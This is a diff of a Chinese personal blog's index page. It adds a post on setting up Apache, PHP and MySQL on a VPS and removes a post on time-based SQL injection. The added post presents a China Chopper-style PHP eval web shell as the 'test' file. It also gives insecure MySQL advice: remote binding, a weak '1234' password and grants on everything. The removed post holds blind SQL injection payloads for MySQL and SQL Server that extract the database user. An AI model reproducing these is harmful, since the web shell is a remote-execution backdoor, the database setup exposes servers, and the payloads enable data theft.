@@ -194,6 +194,105 @@
           
           
             
+              <a class="post-title-link" href="/2015/11/20/VPS使用记录-APACHE-PHP-MYSQL环境搭建/" itemprop="url">
+                VPS使用记录-APACHE+PHP+MYSQL环境搭建
+              </a>
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2015-11-20T16:41:51+08:00" content="2015-11-20">
+            2015-11-20
+          </time>
+        </span>
+
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/2015/11/20/VPS使用记录-APACHE-PHP-MYSQL环境搭建/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2015/11/20/VPS使用记录-APACHE-PHP-MYSQL环境搭建/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        
+          <span itemprop="articleBody"><p>之前搭建过一回用的的LAMP一键安装SHELL脚本，也不明白其中的过程，在这里把分部搭建的过程记录下来加深理解。</p>
+<h2 id="安装过程">安装过程</h2><pre><code>apt-get <span class="operator"><span class="keyword">install</span> apache2
+apt-<span class="keyword">get</span> <span class="keyword">install</span> mysql-<span class="keyword">server</span>-<span class="number">5.5</span>           #安装过程中需要输入root用户密码
+apt-<span class="keyword">get</span> <span class="keyword">install</span> php5 libapache2-<span class="keyword">mod</span>-php5
+apt-<span class="keyword">get</span> <span class="keyword">install</span> libapache2-<span class="keyword">mod</span>-auth-mysql
+apt-<span class="keyword">get</span> <span class="keyword">install</span> php5-mysql
+/etc/init.<span class="keyword">d</span>/apache2 restart                    #重启
+/<span class="keyword">var</span>/www/                                      #根目录</span>
+</code></pre><p>添加如下php文件进行测试，看看能否正常解析</p>
+<pre><code><span class="php"><span class="preprocessor">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[password]);<span class="preprocessor">?&gt;</span></span>            #菜刀连接
+</code></pre><h2 id="mysql远程连接配置">mysql远程连接配置</h2><pre><code>netstat -anl | <span class="keyword">grep</span> <span class="number">3306</span>     #mysql默认不允许远程连接
+在/etc/mysql/my.<span class="keyword">cnf</span>文件下找到如下代码
+/etc/mysql/my.<span class="keyword">cnf</span>
+
+# Instead of skip-networking the default <span class="keyword">is</span> now <span class="keyword">to</span> listen <span class="keyword">only</span> <span class="keyword">on</span>  
+# localhost which <span class="keyword">is</span> more compatible <span class="built_in">and</span> <span class="keyword">is</span> not less secure.  
+bind-address  = <span class="number">127.0</span>.<span class="number">0.1</span>  
+
+将bind-address注释掉或者改成自己的ip，在这里我给注释掉了。
+
+进入mysql创建用户
+mysql&gt; <span class="built_in">insert</span> into mysql.user(Host,User,Password) <span class="built_in">values</span>(<span class="string">"localhost"</span>,<span class="string">"test"</span>,password(<span class="string">"1234"</span>));
+
+分配权限
+mysql&gt; grant <span class="keyword">all</span> privileges <span class="keyword">on</span> *.* <span class="keyword">to</span> test;
+mysql&gt; grant <span class="keyword">all</span> privileges <span class="keyword">on</span> *.* <span class="keyword">to</span> test with grant option;
+
+在本机适用以下命令连接
+
+mysql -<span class="keyword">h</span> IP -uUsername -pPassword #-<span class="keyword">u</span> 和 Username之间空格可加可不加 -<span class="keyword">p</span>和Password之间不能有空格
+</code></pre><p>说明：<br>新建用户的时候Host内容为允许连接的IP或者‘%’（允许所有IP连接）这里选用后者。<br>因为可以远程连接password设为强密码。</p>
+</span>
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
               <a class="post-title-link" href="/2015/11/20/VPS使用记录-使用Tor搭建匿名服务器/" itemprop="url">
                 VPS使用记录-使用Tor搭建匿名服务器
               </a>
@@ -463,8 +562,8 @@ vim /etc/rc.<span class="keyword">local</span>               <span class="commen
           
           
             
-              <a class="post-title-link" href="/2015/11/09/aphache性能优化记录/" itemprop="url">
-                aphache性能优化记录
+              <a class="post-title-link" href="/2015/11/09/apache性能优化记录/" itemprop="url">
+                apache性能优化记录
               </a>
             
           
@@ -485,8 +584,8 @@ vim /etc/rc.<span class="keyword">local</span>               <span class="commen
           
             <span class="post-comments-count">
               &nbsp; | &nbsp;
-              <a href="/2015/11/09/aphache性能优化记录/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count ds-thread-count" data-thread-key="2015/11/09/aphache性能优化记录/" itemprop="commentsCount"></span>
+              <a href="/2015/11/09/apache性能优化记录/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2015/11/09/apache性能优化记录/" itemprop="commentsCount"></span>
               </a>
             </span>
           
@@ -501,7 +600,7 @@ vim /etc/rc.<span class="keyword">local</span>               <span class="commen
 
       
         
-          <span itemprop="articleBody"><h2 id="aphache开启压缩功能">aphache开启压缩功能</h2><p>aphache配置文件做如下更改</p>
+          <span itemprop="articleBody"><h2 id="apache开启压缩功能">apache开启压缩功能</h2><p>apache配置文件做如下更改</p>
 <pre><code><span class="constant">LoadModule </span>deflate_module modules/mod_deflate.so
 
 &lt;ifmodule mod_deflate.c&gt;
@@ -1203,90 +1302,6 @@ req = urllib2.Request(url = <span class="string">"http://www.aokang.cn/member/ve
 
 
     
-      
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      
-      
-        <h1 class="post-title" itemprop="name headline">
-          
-          
-            
-              <a class="post-title-link" href="/2015/09/18/延时sql注入脚本/" itemprop="url">
-                延时sql注入脚本
-              </a>
-            
-          
-        </h1>
-      
-
-      <div class="post-meta">
-        <span class="post-time">
-          发表于
-          <time itemprop="dateCreated" datetime="2015-09-18T16:07:54+08:00" content="2015-09-18">
-            2015-09-18
-          </time>
-        </span>
-
-        
-
-        
-          
-            <span class="post-comments-count">
-              &nbsp; | &nbsp;
-              <a href="/2015/09/18/延时sql注入脚本/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count ds-thread-count" data-thread-key="2015/09/18/延时sql注入脚本/" itemprop="commentsCount"></span>
-              </a>
-            </span>
-          
-        
-      </div>
-    </header>
-
-    <div class="post-body">
-
-      
-      
-
-      
-        
-          <span itemprop="articleBody"><p>昨天找到个延时注入,sqlmap跑出来数据库类型,试了下sqlmap生成payload好使,就自己动手写一个脚本验证一下.<br>记录下实现过程:</p>
-<h2 id="实现逻辑">实现逻辑</h2><pre><code><span class="keyword">try</span>:
-    发送payload
-    payload = <span class="string">"aaa';sleep(10)"</span>
-    conn = httplib.<span class="type">HTTPConnection</span>(host,timeout = <span class="number">5</span>);
-    conn.request(<span class="keyword">method</span>=<span class="string">"POST"</span>,url=<span class="string">"目标"</span>,body=payload,headers=headers);
-    conn.getresponse()
-    conn.close()
-expect:
-    如果发现异常说明当前payload判断正确
-</code></pre><h2 id="MYSQL相关函数">MYSQL相关函数</h2><p>在mysql中注入payload可能是这样的</p>
-<pre><code>aaa,;<span class="keyword">if</span><span class="params">(ascii<span class="params">(mid<span class="params">(lower<span class="params">(user<span class="params">()</span>)</span>,<span class="number">1</span>,<span class="number">1</span>)</span>,sleep<span class="params">(<span class="number">8</span>)</span>,<span class="number">0</span>)</span>)</span>=<span class="number">97</span>
-</code></pre><p>说明:<br>1.当前用户(user)小写(lower)第一个字母(mid)的ascii码(ascii)等于97时延时(sleep)8秒.<br>2.mid(p1,p2,p3) p1为字符串,p2为起始位置,p3长度<br>3.在python中可以使用ord(“s”)来对应小写字母s的ascii码</p>
-<h2 id="SQLSERVER相关函数">SQLSERVER相关函数</h2><p>在sqlserver中payload可能是这样的</p>
-<pre><code>username=aa';if(ascii(substring(system_user,%d,1))=%d) <span class="operator"><span class="keyword">begin</span> WAITFOR DELAY <span class="string">'0:0:10'</span> <span class="keyword">end</span><span class="comment">--" % (i,ord(s))</span></span>
-</code></pre><p>说明:<br>1.当前用户(system_user)第i个字母(substring)的ascii码(ascii)等于小写字母s对应的ascii码(ord)时,延时(WAITFOR DELAY)10秒.<br>2.substring(p1,p2,p3) p1为字符串,p2为起始位置,p3长度,和mysql中的mid函数功能类似<br>3.ord是python内建函数,其他的函数是在目标数据库中执行的.</p>
-</span>
-        
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1325,7 +1340,7 @@ expect:
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">38</span>
+              <span class="site-state-item-count">39</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -1339,7 +1354,7 @@ expect:
 
           <div class="site-state-item site-state-tags">
             <a href="/tags">
-              <span class="site-state-item-count">35</span>
+              <span class="site-state-item-count">37</span>
               <span class="site-state-item-name">标签</span>
               </a>
           </div>
